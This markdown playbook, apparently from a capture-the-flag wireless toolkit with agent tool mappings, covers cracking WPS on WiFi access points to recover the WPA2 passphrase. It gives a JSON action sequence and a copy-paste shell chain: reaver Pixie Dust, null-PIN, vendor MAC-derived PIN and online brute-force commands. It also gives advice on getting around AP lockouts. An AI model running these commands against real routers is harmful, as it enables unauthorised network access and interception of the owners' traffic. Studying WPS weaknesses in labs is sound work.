# WPS PIN flag — WPS is on, brute the PIN

**Verified against:** reaver 1.6.6 as of 2026-Q3

Reaver, Pixie Dust, null-PIN, vendor-derived PIN. Order matters.

## Recognition

Beacon carries a WPS IE (`wlan.tag.number == 221` with vendor
type 0x0050f204). Fields to read:

- **WPS Version** — 1.0 or 2.0.
- **WPS State** — 1 (unconfigured), 2 (configured).
- **AP Setup Locked** — 0 open / 1 locked.
- **WPS Manufacturer / Model Name / Model Number** — vendor tell.

Look for `Configured=2, Locked=0` on a manufacturer with a known PIN
derivation or Pixie-Dust-vulnerable chipset (Broadcom, Ralink).

## The one-shot sequence — try in this order

```python
run_sequence([
    # 1. Pixie Dust — offline, seconds.
    {"action": "wps_pixiedust",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "timeout_s": 60},

    # 2. Null-PIN — some ISP-supplied gear accepts empty.
    {"action": "wps_reaver_pin",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "pin": "",
     "timeout_s": 30},

    # 3. Vendor-derived PIN — Belkin/D-Link MAC-based.
    {"action": "wps_vendor_pin_derive",
     "bssid": "AA:BB:CC:DD:EE:FF"},
    {"action": "wps_reaver_pin",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "pin": "<derived>",
     "timeout_s": 30},

    # 4. Online brute — slow, may lock the AP.
    {"action": "wps_reaver_online",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "timeout_s": 3600},
])
```

## MCP mapping / fallback

None of `wps_pixiedust`, `wps_reaver_pin`, `wps_vendor_pin_derive`, or
`wps_reaver_online` are wired as MCP tools in `src/` — WPS is out of
scope for the current Pineapple API/SSH surface. Drive the on-host
tools directly.

**Fallback shell chain:**

```bash
# 1. Pixie Dust (offline)
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -K 1 -N -vv
#   or:   pixiewps -e <pke> -r <pkr> -s <ehash1> -z <ehash2> \
#                  -a <authkey> -n <enonce>

# 2. Null-PIN attempt
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -p '' -vv

# 3. Vendor-derived PIN (Belkin/D-Link/TP-Link etc.)
#    Compute the candidate PIN offline first, then try it.
python3 vendor-pin-derive.py --mac AA:BB:CC:DD:EE:FF --vendor belkin
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -p <derived> -vv

# 4. Online brute — slow, may lock the AP
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -N -L
```

## The flag surface

WPS success yields the WPA2 PSK directly (WSC M7 message). The PSK is
usually the flag, or unlocks a data-frame decrypt containing the flag.

## Common tools

- **`reaver`** — the classic online + Pixie Dust driver.
- **`bully`** — alternative, sometimes more robust.
- **`pixiewps`** — the Pixie Dust computation itself.
- **`OneShotPin.py`** — vendor-PIN + Pixie Dust in one script.
- **`hcxlabtool`** — aggressive multi-target WPS+PMKID sweep.

## Vendor PIN algorithms worth trying

- **Belkin** — PIN derived from device MAC via a fixed table.
- **D-Link (some)** — MAC-derived, published in
  `default-psk`/`wps-vendor-pin-derivation`.
- **TP-Link (some)** — MAC-based, generation-dependent.

## Failure modes

- **AP Setup Locked=1** and stays locked — wait 60 s (typical
  lock timeout) and retry, or use `wps-locked-bypass-timing`.
- **Pixie Dust returns no PIN.** AP is not Broadcom-family or has
  a patched E-S1/E-S2 generator. Fall back to online brute or
  vendor derivation.
- **Online brute lockout.** Some APs lock after N failed PINs
  forever. If Reaver output shows a "rate limit" pattern, stop and
  wait; don't burn the target.

## Cite

- attacks.json: `wps-reaver-online`, `wps-pixie-dust`,
  `wps-null-pin`, `wps-vendor-pin-derivation`,
  `wps-locked-bypass-timing`, `wps-negative-pin`,
  `wps-pbc-window-abuse`, `wps-hcxlabtool-aggressive`.
- Bongard 2014; Viehböck 2011.
